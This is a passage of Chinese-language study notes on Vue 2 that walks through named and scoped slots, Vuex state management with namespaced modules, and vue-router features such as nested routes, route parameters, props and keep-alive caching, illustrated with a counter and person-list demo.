            <!-- 这个显示图片 -->
            <img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
        </Category>        
        <Category title="游戏">
            <!-- 这个使用列表 -->
            <ul>
                <li v-for="(game, index) of games" :key="index">{{game}}</li>
            </ul>
        </Category>        
        <Category title="电影">
            <!-- 这个使用video -->
            <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
        </Category>
    </div>
</template>
<script>
import Category from './components/Category.vue';
export default {
    ......
    data() {
        return {
            games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
        }
    },
};
</script>
```



### ③具名插槽

**说明**：如果有多个插槽，我们需要使用具名插槽，通过name属性来指定插入的是那个插槽，如果存在多个插槽，但是没有具名的话，那么vue就不知道要放到那个插槽，vue就会哪里也不放，就会到值没有渲染出来

==**注意**：使用了具名插槽，那么在使用的时候也要进行指定，不然同样是没有效果的==



#### 1.普通标签写法

**Category组件修改**

```vue
<template>
	<div class="category">
		<h3>{{ title }}分类</h3>
		<!-- <li>{{item}}</li> -->
		<!-- 使用插槽 -> 默认插槽 -->
		<slot name="center">我是插槽，如果使用者没有给我传入结构，那么我就显示</slot>
		<slot name="footer">我是插槽，如果使用者没有给我传入结构，那么我就显示</slot>
	</div>
</template>
```

**App组件（父组件）**

```vue
<template>
    <div class="container">
        <Category title="美食">
            <!-- 这个显示图片 -->
            <img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
            <h3 slot="footer">美食底部</h3>
        </Category>        
        <Category title="游戏">
            <!-- 这个使用列表 -->
            <ul slot="center">
                <li v-for="(game, index) of games" :key="index">{{game}}</li>
            </ul>
            <h3 slot="footer">游戏底部</h3>
        </Category>        
        <Category title="电影">
            <!-- 这个使用video -->
            <video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
            <h3 slot="footer">电影底部</h3>
        </Category>
    </div>
</template>
```

#### 2.template标签写法

**说明**：使用template标签的方式就可以省去一层结构，如果不使用的话我们需要外面包一层div，然后再这个div上指定使用哪个插槽，不破坏原来结构的方式就是用template标签

```vue
<Category title="电影">
    <!-- 这个使用video -->
    <video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
    <!-- 使用template标签的方式就可以省去一层结构 -->
    <template v-slot:footer>
        <div class="foot">
            <a href="http://www.atguigu.com">经典</a>
            <a href="http://www.atguigu.com">热门</a>
            <a href="http://www.atguigu.com">推荐</a>
        </div>
		<h4>欢迎前来观影</h4>
    </template>
</Category>
```



### ④作用域插槽

**理解**：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

**说明**：数据在可以通过插槽传递给父组件，由父组件来使用这个数据进行结构和数据的渲染

**举个简单的列子**：就是我把钱和地交给你，房子怎么建就看你

**使用方式**：

-   子组件 --> 往插槽传数据**`<slot :xxx="xxx"></slot>`**,xxx是数据名，自定义

-   父组件 --> **`<template slot-scope="{xxx}"></template>`**,xxx是子组件绑定的属性名

    也可以简写成**`*<template scope="{games}"></template>`**

==**注意**：必须是template标签才能使用作用域插槽==

**代码实现**

App组件

```vue
<template>
	<div class="container">
		<Category>
			<!-- 无序列表 - slot-scope简写形式scope -->
			<template scope="{games}">
				<ul>
					<li v-for="(g, index) of games" :key="index">{{ g }}</li>
				</ul>
			</template>
		</Category>
		<Category>
			<!-- 无序列表 - slot-scope形式 -->
			<template slot-scope="{ games }">
				<ol>
					<li v-for="(g, index) of games" :key="index">{{ g }}</li>
				</ol>
			</template>
		</Category>
		<Category>
			<!-- 标题形式 - slot-scope形式 -->
			<template slot-scope="{ games }">
				<h4 v-for="(g, index) of games" :key="index">{{ g }}</h4>
			</template>
		</Category>
	</div>
</template>
```

Category组件

```vue
<template>
	<div class="category">
		<h3>{{ title }}分类</h3>
		<slot :games="games">我是插槽，如果使用者没有给我传入结构，那么我就显示</slot>
	</div>
</template>
```





# 四、VueX

## 1	vuex概述

### ① vuex 是什么

1.   概念：专门在 Vue 中实现集中式**状态（数据）**管理的一个 Vue 插件，对 vue 应 用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方 式，且适用于任意组件间通信。 

2.   Github 地址: https://github.com/vuejs/vuex 

==**总结**：vuex其实就是一个用于共享数据的东西，数据在vuex经过加工处理，然后重新进行渲染到页面上==



### ② 什么时候使用 Vuex

1.   多个组件依赖于同一状态 
2.   来自不同组件的行为需要变更同一状态



### ③安装和使用

```shell
# 安装vuex
npm i vuex
```

**在src创建store，store下创建index.js文件**

```js
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue';
// 引入vuex
import Vuex from 'vuex';
// 使用vuex
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {}
//准备mutations——用于操作数据（state）
const mutations = {}
// 准备state——用于存储数据
const state = {}
// 创建并暴露state
export default new Vuex.Store({
    actions,
    mutations,
    state,
})
```

==**注意**：使用的时候不能在main.js（入口文件）使用，因为要在导入store之前使用`Vue.use(Vuex)`，不然它会报错，所以我们要在store/index.js文件中使用Vuex插件==

**备注**：vue-cli脚手架它不管你的位置如何，它都会导入，然后再往下执行代码



**main.js中引用store**

```js
import store from './store';

// 创建vm
new Vue({
	......
    // 配置store
    store,
	......
})
```

![image-20211203144218759](D:\学习笔记\img\20211203144220.png)

安装完成之后，在vm和vc身上都能看到`$store`这个对象





## 2	原理分析

![vuex](D:\学习笔记\img\20211203092309.png)

**说明**：

三个重要对象

-   Actions：在Actions中可以进行业务代码的编写，比如多少秒执行一次
    -   stole.dispatch：组件通过这个函数将要执行的动作传递给Actions
    -   Backend API：这个是可以向其他服务器请求数据，然后进行数据的处理
-   Mutations：这里就是对数据的加工，比如 +1
    -   stole.commit：Actions通过这个方法传递数据给Mutations，当然组件可以绕过Actions直接将数据直接提交给Mutations
-   state：这是用来存储数据的
    -   Render：vuex会帮我们做渲染，数据加工完成就会将state中的数据修改，然后渲染到页面上

<span style="color:red">这三个对象都是由stole来进行管理的</span>

![image-20211203172533909](D:\学习笔记\img\20211203172535.png)





## 3	求和案例纯vue版

```vue
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<select v-model.number="n">
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
export default {
	name: "Count",
	data() {
		return {
			sum: 0, // 求和总数
			n: 1, // 一次的量数
		};
	},
	methods: {
		increment(){
			this.sum += this.n
		},
		decrement(){
			this.sum -= this.n
		},
		incrementOdd(){
			if (this.sum % 2) {
				this.sum += this.n
			}
		},
		incrementWait(){
			setTimeout(() => {
				this.sum += this.n
			}, 500)
		},
	},
};
</script>
<style>
	button {
		margin-left: 5px;
	}
</style>
```





## 4	vuex来实现求和案例

首先搭建好vuex的初始化环境，可以参看上面的

**Count组件**

```vue
<script>
export default {
	......
	methods: {
		// increment() {
		// 	this.$store.dispatch("jia", this.n);
		// },
		// decrement() {
		// 	this.$store.dispatch("jian", this.n);
		// },	

		// 没有什么业务的可以直接commit给mutations
		increment() {
			this.$store.commit("JIA", this.n);
		},
		decrement() {
			this.$store.commit("JIAN", this.n);
		},
		// 这两个是有业务逻辑的，所以要经过actions
		incrementOdd() {
			this.$store.dispatch("jiaOdd", this.n);
		},
		incrementWait() {
			this.$store.dispatch("jiaWait", this.n);
		},
	},
};
</script>
```

**store/index.js**

```js
......
//准备actions——用于响应组件中的动作
const actions = {
    // jia(context, value) {
    //     // console.log(context, value);
    //     context.commit('JIA', value)
    // },    
    // jian(context, value) {
    //     context.commit('JIAN', value)
    // },
    jiaOdd(context, value) {
        if(context.state.sum % 2) {
            context.commit('JIA', value)
        }
    },
    jiaWait(context, value) {
        setTimeout(() => {
			context.commit('JIA', value)
        }, 500);
    }
}
//准备mutations——用于操作数据（state）
const mutations = {
    // 传过来的是state对象和actions中传入的值
    JIA(state, value) {
        // console.log(state, value);
        state.sum += value
    },
    JIAN(state, value) {
        state.sum -= value
    },
}
// 准备state——用于存储数据
const state = {
    sum: 0   // 准备好数据
}
......
```

`console.log(context, value);`输出的结果如下,**mini版的store**

![image-20211203144805681](D:\学习笔记\img\20211203144807.png)





## 5	getters的使用

**说明**：它就相当于是我们之前所学的computed计算属性，计算之后返回一个全新的值，computed它只能用于当前组件，其他组件是用不了的，而**getters是所有组件都能使用到的**

### 求和案例修改



### ① Count组件

```vue
<template>
	<div>
		......
		<h3>当前求和放大10倍为：{{ $store.getters.bigSum }}</h3>
		......
	</div>
</template>
```



### ②store/index.js

```js
// 添加getters配置项
const getters = {
    // 接收的是state
    bigSum(state) {
        return state.sum * 10
    }
}
```





## 6	四个map方法的使用

vuex提供的四个方法，用于生成对应的方法，不要我们程序员自己动手去写，因为如果东西多的话自己手写就很费力，自动生成的更省事和省时

==**这四个方法的使用都是类似**的：只有当方法名和使用的对象名一样的时候才能使用数组写法==



**添加多点内容**

```html
Count组件
<h3>学校：{{ school }}</h3>
<h3>人群：{{ student }}</h3>
```

```js
stole/index.js
const state = {
    // 准备好数据
    sum: 0, 
    school: "社会大学",
    student: "社会人",
}
```



### ① mapState方法

#### 1.背景

我们发现很多插值语法处写了较长的代码，很显然不符合vue开发的要求

![image-20211203155157464](D:\学习笔记\img\20211203155158.png)

**优化**：使用computed计算属性

```js
	computed: {
		sum() {
			return this.$store.state.sum
		},
		school() {
			return this.$store.state.school
		},
		student() {
			return this.$store.state.student
		},
		bigSum() {
			return this.$store.getters.bigSum
		},
	},
```



#### 2.使用方法生成

只有`this.$store.state.xxx`这种形式的才能使用mapState方法自动生成

```js
	computed: {
		// 程序员自己手写
		// sum() {
		// 	return this.$store.state.sum
		// },
		// school() {
		// 	return this.$store.state.school
		// },
		// student() {
		// 	return this.$store.state.student
		// },

		/* 
			使用mapState方法自动生成（对象写法）
			key是计算属性的名字，使用的时候要根据这个名字去使用
			mapState方法返回的是一个对象，对象里面是生成的方法
			...是ES6的语法，作用是展开对象里面的内容
		*/
		// ...mapState({ he: "sum", xuexiao: "school", xuesheng: "student" }),

		/*
		 	使用mapState方法自动生成（数组写法）
			只有当计算属性名和使用的名相同的时候才能使用这种方式
		*/
		...mapState(["sum", "school", "student"]),

		bigSum() {
			return this.$store.getters.bigSum;
		},
	},
```



### ② mapGetters

只有`this.$store.getters.xxx`这种形式的才能使用mapGetters方法自动生成

```js
// ...mapGetters({dahe:'bigSum'}),	// 对象写法
...mapGetters(['bigSum'])		// 数组写法
```



### ③ mapActions

只有`this.$store.dispatch`这种形式的才能使用mapAction自动生成

```js
	methods: {
		// 没有什么业务的可以直接commit给mutations
		increment() {
			this.$store.commit("JIA", this.n);
		},
		decrement() {
			this.$store.commit("JIAN", this.n);
		},
		
		// 程序员自己手写
		// incrementOdd() {
		// 	this.$store.dispatch("jiaOdd", this.n);
		// },
		// incrementWait() {
		// 	this.$store.dispatch("jiaWait", this.n);
		// },

		// 对象写法,key可以随意，value必须是调用方法的值
		...mapActions({incrementOdd:'jiaOdd', incrementWait: 'jiaWait'})
        
        // 数组写法  -->  key一定是和value值一致才能使用数组写法
		...mapActions(['jiaOdd', 'jiaWait'])
	},
```

**注意**：模板在使用的时候需要指定将要修改的数据传给方法，不然会报错

```html
<template>
	<div>
        ......
		<button @click="incrementOdd(n)">当前和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
	</div>
</template>
```



### ④ mapMutations

和mapAction的用法类似，只有`this.$store.commit`这种形式的才能使用mapAction自动生成

```js
		// 没有什么业务的可以直接commit给mutations
		// increment() {
		// 	this.$store.commit("JIA", this.n);
		// },
		// decrement() {
		// 	this.$store.commit("JIAN", this.n);
		// },

		// 对象写法
		...mapMutations({increment:'JIA', decrement: 'JIAN'}),
		// 数组写法
		...mapMutations(['JIA', 'JIAN']),
```

```html
<template>
	<div>
        ......
		<button @click="JIA(n)">+</button>
		<button @click="JIAN(n)">-</button>
        ......
	</div>
</template>
```



## 7	多组件共享数据案例

修改求和案例，添加一个Person组件

```vue
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color:red">Count组件求和为：{{sum}}</h3>
		<input type="text" placeholder="请输入名字" v-model="name">
		<button @click="add">添加</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{p.name}}</li>
		</ul>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
import { mapState } from 'vuex'
	export default {
		name:'Person',
		data() {
			return {
				name:''
			}
		},
		computed:{
            ...mapState(['sum', 'personList'])
		},
		methods: {
			add(){
				const personObj = {id:nanoid(),name:this.name}
				this.$store.commit('ADD_PERSON',personObj)
				this.name = ''
			}
		},
	}
</script>
```

往state和mutations中添加东西

```js
const mutations = {
    ......
    ADD_PERSON(state, value) {
        state.personList.unshift(value)
    },
}
// 准备state——用于存储数据
const state = {
	......
    personList: [],
}
```

修改Count组件

```vue
<template>
	<div>
		......
		<h3>Person组件的总人数为：{{count}}</h3>
		......
	</div>
</template>

<script>
import { mapActions, mapGetters, mapMutations, mapState } from "vuex";
export default {
	......
	computed: {
		count() {
			return this.$store.state.personList.length
		},
        ......
	},
     ......
};
</script>
```





## 8	模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

    ```javascript
    const countAbout = {
      namespaced:true,//开启命名空间
      state:{x:1},
      mutations: { ... },
      actions: { ... },
      getters: {
        bigSum(state){
           return state.sum * 10
        }
      }
    }
    
    const personAbout = {
      namespaced:true,//开启命名空间
      state:{ ... },
      mutations: { ... },
      actions: { ... }
    }
    
    const store = new Vuex.Store({
      modules: {
        countAbout,
        personAbout
      }
    })
    ```

3. 开启命名空间后，组件中读取state数据：

    ```js
    //方式一：自己直接读取
    this.$store.state.personAbout.list
    //方式二：借助mapState读取：
    ...mapState('countAbout',['sum','school','subject']),
    ```

4. 开启命名空间后，组件中读取getters数据：

    ```js
    //方式一：自己直接读取
    this.$store.getters['personAbout/firstPersonName']
    //方式二：借助mapGetters读取：
    ...mapGetters('countAbout',['bigSum'])
    ```

5. 开启命名空间后，组件中调用dispatch

    ```js
    //方式一：自己直接dispatch
    this.$store.dispatch('personAbout/addPersonWang',person)
    //方式二：借助mapActions：
    ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
    ```

6. 开启命名空间后，组件中调用commit

    ```js
    //方式一：自己直接commit
    this.$store.commit('personAbout/ADD_PERSON',person)
    //方式二：借助mapMutations：
    ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
    ```



### 修改之前的案例

#### store下的文件

index.js

```js
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue';
// 引入vuex
import Vuex from 'vuex';
// 使用vuex
Vue.use(Vuex)
import countOptions from './count';
import personOptions from './person';

// 创建并暴露state
export default new Vuex.Store({
    modules: {
        countAbout: countOptions,
        personAbout: personOptions,
    }
})
```

count.js

```js
export default {
    // 命名空间
    namespaced: true,
    actions: {
        jiaOdd(context, value) {
            if (context.state.sum % 2) {
                context.commit('JIA', value)
            }
        },
        jiaWait(context, value) {
            setTimeout(() => {
                context.commit('JIA', value)
            }, 500);
        }
    },
    mutations: {
        // 传过来的是state对象和actions中传入的值
        JIA(state, value) {
            // console.log(state, value);
            state.sum += value
        },
        JIAN(state, value) {
            state.sum -= value
        },
    },
    state: {
        // 准备好数据
        sum: 0,
        school: "社会大学",
        student: "社会人",
    },
    getters: {
        // 接收的是state
        bigSum(state) {
            return state.sum * 10
        }
    },
}
```

person.js

```js
import { nanoid } from "nanoid"
import axios from 'axios'
export default {
    // 命名空间
    namespaced: true,
    actions: {
        addPersonWang(context, value) {
            if (value.name.indexOf('王') === 0) {
                context.commit("ADD_PERSON", value)
            } else {
                alert("必须输入姓王的人")
            }
        },
        randomAddPerson(context) {
            axios.get('https://api.uixsj.cn/hitokoto/get?type=social').then(
				response => {
					context.commit('ADD_PERSON',{id:nanoid(),name:response.data})
				},
				error => {
					alert(error.message)
				}
			)
        }
    },
    mutations: {
        ADD_PERSON(state, value) {
            state.personList.unshift(value)
        },
    },
    state: {
        personList: [
            {id: nanoid(), name: '法外狂徒-张三'}
        ],
    },
    getters: {
        firstName(state) {
            return state.personList[0].name
        }
    },
}
```



#### 组件

Count组件

```vue
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和放大10倍为：{{ bigSum }}</h3>
		<h3>学校：{{ school }}</h3>
		<h3>人群：{{ student }}</h3>
		<h3>Person组件的总人数为：{{count}}</h3>
		<select v-model.number="n">
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="JIA(n)">+</button>
		<button @click="JIAN(n)">-</button>
		<button @click="jiaOdd(n)">当前和为奇数再加</button>
		<button @click="jiaWait(n)">等一等再加</button>
	</div>
</template>

<script>
import { mapActions, mapGetters, mapMutations, mapState } from "vuex";
export default {
	name: "Count",
	data() {
		return {
			n: 1, // 一次的量数
		};
	},
	computed: {
		count() {
			return this.$store.state.personAbout.personList.length
		},
		// ...mapState({ he: "sum", xuexiao: "school", xuesheng: "student" }),
		...mapState("countAbout", ["sum", "school", "student"]),

		// ...mapGetters({dahe:'bigSum'}),	// 对象写法
		...mapGetters("countAbout", ['bigSum'])		// 数组写法
	},
	methods: {

		// 对象写法
		// ...mapMutations("countAbout", {increment:'JIA', decrement: 'JIAN'}),
		// 数组写法
		...mapMutations("countAbout", ['JIA', 'JIAN']),

		// 对象写法  -->  key可以随意，value必须是调用方法的值
		// ...mapActions("countAbout", {incrementOdd:'jiaOdd', incrementWait: 'jiaWait'}),

		// 数组写法  -->  key一定是和value值一致才能使用数组写法
		...mapActions("countAbout", ['jiaOdd', 'jiaWait'])
	},
};
</script>
<style>
button {
	margin-left: 5px;
}
</style>
```

person组件

```vue
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color: red">Count组件求和为：{{ sum }}</h3>
		<h3>列表中第一个名字为{{firstName}}</h3>
		<input type="text" placeholder="请输入名字" v-model="name" />
		<button @click="add">添加</button>
		<button @click="addPersonWang">只添加姓王的</button>
		<button @click="randomAddPerson">随机添加人</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{ p.name }}</li>
		</ul>
	</div>
</template>

<script>
import { nanoid } from "nanoid";
import { mapState } from "vuex";
export default {
	name: "Person",
	data() {
		return {
			name: "",
		};
	},
	computed: {
		...mapState("countAbout", ["sum"]),
		personList() {
			return this.$store.state.personAbout.personList;
		},
		firstName() {
			return this.$store.getters['personAbout/firstName']
		}
	},
	methods: {
		add() {
			const personObj = { id: nanoid(), name: this.name };
			this.$store.commit("personAbout/ADD_PERSON", personObj);
			this.name = "";
		},
		addPersonWang() {
			const personObj = { id: nanoid(), name: this.name };
			this.$store.dispatch("personAbout/addPersonWang", personObj);
		},
		randomAddPerson() {
			this.$store.dispatch("personAbout/randomAddPerson");
		},
	},
};
</script>
```







# 五	路由

## 1	概述

### ①什么是路由

1.   一个路由就是一组映射关系（key - value） 
2.   key 为路径, value 可能是 function 或 component 



### ②路由分类

1.   后端路由：

     1.   理解：value 是 function, 用于处理客户端提交的请求。 
     2.   工作过程：服务器接收到一个请求时, 根据**请求路径**找到匹配的**函数** 来处理请求, 返回响应数据。 

2.   前端路由：

     1)   理解：value 是 component，用于展示页面内容。 

     2)   工作过程：当浏览器的路径改变时, 对应的组件就会显示。





### ③安装

```shell
# 安装
npm i vue-route
```





## 2	基本使用

### ①安装和创建路由文件

main.js文件中引入和使用

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false
// 引入路由
import vueRouter from 'vue-router';
// 使用路由
Vue.use(vueRouter)
import router from './router';

new Vue({
  render: h => h(App),
  // 配置router
  router: router,
}).$mount('#app')
```



### ②编写组件

修改App组件

```vue
<template>
	<div>
		<div class="row">
			<div class="col-xs-offset-2 col-xs-8">
				<div class="page-header"><h2>Vue Router Demo</h2></div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-2 col-xs-offset-2">
				<div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
					<!-- <a class="list-group-item active" href="./about.html">About</a> -->
					<!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link
						class="list-group-item"
						active-class="active"
						to="/about"
						>About</router-link
					>
					<router-link
						class="list-group-item"
						active-class="active"
						to="/home"
						>Home</router-link
					>
				</div>
			</div>
			<div class="col-xs-6">
				<div class="panel">
					<div class="panel-body">
						<!-- 指定组件的呈现位置 -->
						<router-view></router-view>
					</div>
				</div>
			</div>
		</div>
	</div>
</template>

<script>
export default {
	name: "App",
};
</script>
```

创建About、Home组件

```vue
// About组件
<template>
	<h2>我是About的内容</h2>
</template>

<script>
export default {
	name: "About",
};
</script>

// Home组件
<template>
	<h2>我是Home的内容</h2>
</template>

<script>
export default {
	name: "Home",
};
</script>
```



### ③配置路由

在src下创建route文件用于放路由文件，创建index.js文件来配置路由

```js
import VueRouter from 'vue-route';
// 引入组件
import About from '../components/About.vue';
import Home from '../components/Home.vue';

export default new VueRouter({
    routes: [
        // 每一个都是key对应的
        {
            path: '/about',
            component: About,
        },
        {
            path: '/home',
            component: Home,
        },
    ]
})
```





## 3	几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的(vue做的)，需要的时候再去挂载（vue做的）。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息，可以输出看有什么东西。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。





## 4	多级路由（路由嵌套）

在Home页面下多出两个路由，分别是News和Message，点击他们两个可以跳转到对应的组件上，实现多级路由

### ①首先修改Home组件

添加两个路由连接，这两个路由连接跳转到对应的两个组件上，然后将他们的内容展示在Home上

```vue
<template>
	<div>
		<h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li>
					<!-- <a class="list-group-item active" href="./home-news.html">News</a> -->
					<router-link
						class="list-group-item"
						active-class="active"
						to="/home/news"
					>News</router-link>
				</li>
				<li>
					<!-- <a class="list-group-item active" href="./home-news.html">Message</a> -->
					<router-link
						class="list-group-item"
						active-class="active"
						to="/home/message"
					>Message</router-link>
				</li>
			</ul>
			<!-- 渲染组件出现的位置 -->
			<router-view></router-view>
		</div>
	</div>
</template>
```



### ②添加News、Message组件

-   News组件

    ```vue
    <template>
    	<ul>
    		<li>news001</li>
    		<li>news002</li>
    		<li>news003</li>
    	</ul>
    </template>
    
    <script>
    export default {
    	name: "News",
    };
    </script>
    ```

-   Message组件

    ```vue
    <template>
    	<div>
    		<ul>
    			<li><a href="/message1">message001</a>&nbsp;&nbsp;</li>
    			<li><a href="/message2">message002</a>&nbsp;&nbsp;</li>
    			<li><a href="/message/3">message003</a>&nbsp;&nbsp;</li>
    		</ul>
    	</div>
    </template>
    
    <script>
    export default {
        name: 'Message',
    };
    </script>
    ```



### ③修改路由

在home路由添加子路由

```js
        {
            path: '/home',
            component: Home,
            // 子路由 --> 套娃，可以套多层
            children: [
                {
                    // 子路由不要有斜杠，不然无效
                    path: "news",
                    component: News,
                },
                {
                    path: "message",
                    component: Message,
                },
            ]
        },
```





## 5	获取路由的参数

我们之前说过`$route`属性存储着路由的基本信息，在里面有一个query对象，里面存着的就是我们url参数值，通过这个我么可以获取到url携带的参数

### ①需求

让Message组件中的每个a标签变成路由标签，让他们都携带参数跳转到Detail组件上并展示到页面上





### ②修改Message组件

让组件中的每个a标签编程路由标签，都跳转到Detail组件上

```vue
<template>
	<div>
		<ul>
			<!-- <li><a href="/message1">message001</a>&nbsp;&nbsp;</li>
			<li><a href="/message2">message002</a>&nbsp;&nbsp;</li>
			<li><a href="/message/3">message003</a>&nbsp;&nbsp;</li> -->
			<li v-for="m in messages" :key="m.id">
				<!-- 字符串写法 -->
				<!-- <router-link
					:to="`/home/message/detail?id=${m.id}&title=${m.title}`"
					>{{m.title}}</router-link
				> -->

				<!-- 对象写法（推荐使用） -->
				<router-link :to="{
                    path: '/home/message/detail',
                    query: {
                        id:m.id,
                        title:m.title,
                    }
                }">{{m.title}}</router-link>
			</li>
			<router-view></router-view>
		</ul>
	</div>
</template>

<script>
export default {
	name: "Message",
	data() {
		return {
			messages: [
				{ id: "001", title: "我是小黑" },
				{ id: "002", title: "我是张三" },
				{ id: "003", title: "我是小红" },
			],
		};
	},
};
</script>
```



### ③添加Detail组件

```vue
<template>
  <ul>
      <li>{{$route.query.id}}</li>
      <li>{{$route.query.title}}</li>
  </ul>
</template>

<script>
export default {
    name: 'Detail',
    mounted() {
        // 通过$route属性获取url参数
        console.log(this.$route)
    },
}
</script>
```

![image-20211204215022779](D:\学习笔记\img\20211204215024.png)





## 6	命名路由

就是在进行路由跳转的时候可以写成name属性指定的名字，而不需要写一段很长的url

作用：可以简化路由的跳转。

使用如下

### ①给路由命名

```js
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
                      name:'hello' //给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```



### ②简化跳转

```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```





## 7	路由的params参数

### ①配置路由

配置路由，声明接收params参数

```js
{
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', //使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```



### ②传递参数

```vue
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
				
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

==**特别注意**：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！==



### ③接收参数

```html
	<ul>
		<li>{{ this.$route.params.id }}</li>
		<li>{{ this.$route.params.title }}</li>
	</ul>
```





## 8	路由的props配置

**作用**：让路由组件更方便的收到参数，组件可以直接props接收到传过来的参数，减少了我们手动取值的麻烦

![image-20211204224002022](D:\学习笔记\img\20211204224003.png)

**说明**：可以看到这样取值不太好，使用computed计算属性的话，如果要取的值太多就会有很多的计算属性，不太好，所以我们可以使用路由的props来给我们组件的props身上，这样我们就可以直接使用了，而不需要很长的调用

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	/*
		第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
			这种写法只能自己自定义数据，然后通过props传递给组件，一般不会使用这个
	*/
	// props:{a:900}

	/*
		第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
			只能接收params参数，query的参数数据是不会接收的
	*/
	// props:true
	
	/*
		第三种写法（推荐）：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
			route是vue帮我们维护的，不需要我们自己传值，我们只需要拿过来使用即可
			这种写法params和query参数都能使用
	*/
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

==**注意**：在使用params的时候，理由的路径一定有声明接收参数，不然会无效的==





## 9	`<router-link>`的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式

2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```

    ![image-20211205170500415](D:\学习笔记\img\20211205170502.png)

    ![image-20211205173040763](D:\学习笔记\img\20211205173042.png)

    

3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

    ==**说明**：使用replace就是会将上一条记录替换，也就是点击回退按钮的话就会回退到上上条记录，如果上上记录也是replace模式的话就会回退到上上上条记录，以此类推...==





## 10	编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 解释：`<router-link>`最后页面渲染的时候还是会变成a标签的形式，但是我们有时候不用a标签

3. 使用  --  $router属性上的方法

    ```js
    // push方式跳转路由
    this.$router.push({
        // 配置项还是和route-link的一样
        name: "xiangqing",
        params: {
            id: m.id,
            title: m.title,
        },
    });
    
    
    // replace方式跳转路由
    this.$router.replace({
        name: "xiangqing",
        params: {
            id: m.id,
            title: m.title,
        },
    });
    
    // 后退
    this.$router.back();
    // 前进
    this.$router.forward();
    
    /* 
    	go就是可以前进也可以后退，通过数字来控制，负数表示后退，正数表示前进，数量表示次数
    		-2就表示后退两次
    */ 
    this.$router.go(-2);
    ```





## 11	缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 解释：我们之前说够，切换路由的本质就是组件的销毁再挂载的过程，所以我们可以不必让组件销毁，然后再进行挂载，我们可以利用缓存路由来实现

3. 何时使用：当需要切换别的路由又切换回来保存状态的路由就需要用到，例如：输入框的输入，我切换到其他的路由，再切换回来，还能看到输入框的输入

4. 具体编码：

    ```vue
    <keep-alive include="News"> 
        <router-view></router-view>
    </keep-alive>
    ```



**news组件修改**

```vue
<template>
	<ul>
		<li>news001<input type="text"></li>
		<li>news002<input type="text"></li>
		<li>news003<input type="text"></li>
	</ul>
</template>
```

**让news路由缓存**

```vue
<div>
    <!-- 使用的是组件名 -->
    <keep-alive include="News">
        <router-view></router-view>
    </keep-alive>
    <!-- 缓存多个路由 -->
    <!-- <keep-alive :include="['News', 'Message']">
